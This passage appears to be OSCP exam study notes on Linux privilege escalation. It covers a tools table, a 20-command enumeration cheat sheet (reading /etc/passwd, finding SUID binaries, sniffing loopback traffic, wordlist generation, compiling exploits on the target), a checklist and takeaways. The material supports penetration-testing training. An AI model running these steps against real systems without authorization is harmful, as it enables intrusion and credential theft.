| GTFOBins | lookup for abusing privileged UNIX binaries |
| AppArmor / `aa-status` | mandatory access-control framework/status; can block otherwise-valid escapes |
| Searchsploit | search local Exploit-DB index |
| GCC | compile C exploit source |
| SCP | transfer exploit source/files over SSH |

---

# OSCP mini cheat sheet

> [!tip] 20 commands/reminders to keep beside you

```bash
# 1) Who am I / what groups do I have?
id

# 2) Other users
cat /etc/passwd

# 3) OS + kernel + architecture
cat /etc/os-release
uname -a
arch

# 4) Processes, especially root/custom processes
ps aux

# 5) Interfaces and possible pivot networks
ip a
routel

# 6) Listening ports, including localhost-only
ss -anp

# 7) Cron jobs / privileged recurring scripts
ls -lah /etc/cron*
crontab -l
grep "CRON" /var/log/syslog

# 8) Sudo rights — always check
sudo -l

# 9) Writable directories
find / -writable -type d 2>/dev/null

# 10) SUID binaries
find / -perm -u=s -type f 2>/dev/null

# 11) Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# 12) Disks and mounts
cat /etc/fstab
mount
lsblk

# 13) Kernel modules
lsmod

# 14) Catch short-lived credential-bearing processes
watch -n 1 "ps -aux | grep pass"

# 15) Check shell environment / dotfiles for secrets
env
cat ~/.bashrc

# 16) If tcpdump is sudo-allowed, inspect local plaintext traffic
sudo tcpdump -i lo -A

# 17) Targeted password pattern generation
crunch 6 6 -t Lab%%% > wordlist

# 18) Search local exploit database after exact version matching
searchsploit "linux kernel <distro/version> Local Privilege Escalation"

# 19) Compile exploit on target when possible
gcc exploit.c -o exploit
file exploit

# 20) After every escalation attempt: verify context
id
whoami
```

## Fast decision checklist

- [ ] Check `sudo -l` early.
- [ ] Look for credentials in environment, dotfiles, scripts, configs, process arguments, and traffic.
- [ ] Map **privileged execution** to **something writable/controllable by you**.
- [ ] Inspect cron jobs and scripts they execute.
- [ ] Enumerate SUID and capabilities; check unusual binaries against GTFOBins.
- [ ] Inspect interfaces/routes before leaving the host; root may turn the host into a pivot.
- [ ] Use automated enumeration, but manually validate the findings.
- [ ] Leave kernel exploitation until safer options have been exhausted.
- [ ] Before a kernel exploit: exact distro + exact kernel + architecture + exploit notes/tested versions.
- [ ] After root: verify with `id`/`whoami`, then continue with credentials, pivoting, and required proof.

---

# Exam-oriented takeaways

1. **Enumeration is not a checklist you run once.** Re-enumerate after switching users or gaining root because the visible attack surface changes.
2. **Credentials are often the cleanest privilege escalation.** A leaked password can be safer and faster than memory corruption or kernel exploitation.
3. **Think in relationships.** A writable file is only valuable if a privileged process consumes it; a privileged binary is only valuable if its behavior can be influenced.
4. **SUID, capabilities, and sudo are different mechanisms.** Enumerate each independently.
5. **Localhost is part of the attack surface.** Services hidden from external Nmap may still be exploitable from your foothold.
6. **Dual-homed hosts matter twice:** they may offer local privilege escalation clues and later become pivot points.
7. **Read errors and logs.** The tcpdump example shows AppArmor defeating an otherwise plausible GTFOBins route; failure can reveal a security control and redirect your search.
8. **Kernel exploitation is version-sensitive and risky.** Match carefully, inspect source instructions, and verify architecture before execution.

---

# One-line mental model

> **Enumerate broadly → identify what privileged component trusts → determine what you control → abuse that trust → verify root → harvest credentials and network reach for the next stage.**
